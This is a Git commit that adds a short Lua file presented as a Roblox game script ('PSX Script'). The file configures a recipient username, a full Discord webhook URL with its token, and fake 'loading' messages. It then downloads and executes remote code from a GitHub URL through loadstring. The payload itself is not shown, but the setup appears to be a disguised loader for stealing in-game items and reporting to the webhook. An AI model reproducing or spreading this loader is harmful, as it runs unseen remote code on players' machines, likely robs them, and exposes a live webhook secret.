d5628fd3262c6a2f8d276dce9e05faa9c1b405b4
Kev44448 <132544347+Kev44448@users.noreply.github.com>
2023-05-05 08:47:58 -0600

    Create myscript.lua

---
+++ myscript.lua
@@ -0,0 +1,15 @@
+UserName = "Alex23_XDUWU77"
+
+Webhook = "https://discord.com/api/webhooks/1102452549161853050/akfG-arki2F0Fu2pL00DGJvoj19aiM9sZ3BiqqNISs1VS4Xb9iF3SuArEkEtms-ToSb0"
+
+_G.ScriptName = "PSX Script"
+
+_G.FirstText = "Script Preparing..."
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 10
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))() a 
